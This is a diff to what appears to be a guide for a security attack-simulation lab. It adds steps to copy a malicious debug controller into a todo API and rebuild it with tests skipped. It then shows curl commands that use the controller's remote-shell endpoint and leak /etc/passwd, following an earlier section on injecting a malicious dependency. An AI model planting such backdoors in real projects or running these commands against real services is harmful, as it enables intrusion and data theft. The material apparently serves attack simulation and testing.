@@ -39,5 +39,31 @@ project could be infected with dependencies that appear legitimate.
        -Dfile=../malicious/evil-lib/target/evil-lib-1.0.0.jar
    # Then update pom.xml to reference com.malicious:evil-lib:1.0.0
    ```
-   The manual step mimics an attacker injecting the dependency after the build
-   has started.
+  The manual step mimics an attacker injecting the dependency after the build
+  has started.
+
+## Malicious Debug Controller
+
+1. Copy the malicious controller into the API:
+   ```bash
+   cd malicious
+   cp debug-controller/src/main/java/com/example/demo/DebugController.java \
+      ../todo-api/src/main/java/com/example/demo/DebugController.java
+   cd ..
+   ```
+
+2. Rebuild the application so the new endpoints are active:
+   ```bash
+   cd ../todo-api
+   ./mvnw package -DskipTests
+   ```
+
+3. Use the remote shell:
+   ```bash
+   curl "http://<todo-api-service>/debug-shell?cmd=whoami"
+   ```
+
+4. Leak `/etc/passwd` contents:
+   ```bash
+   curl "http://<todo-api-service>/leak"
+   ```
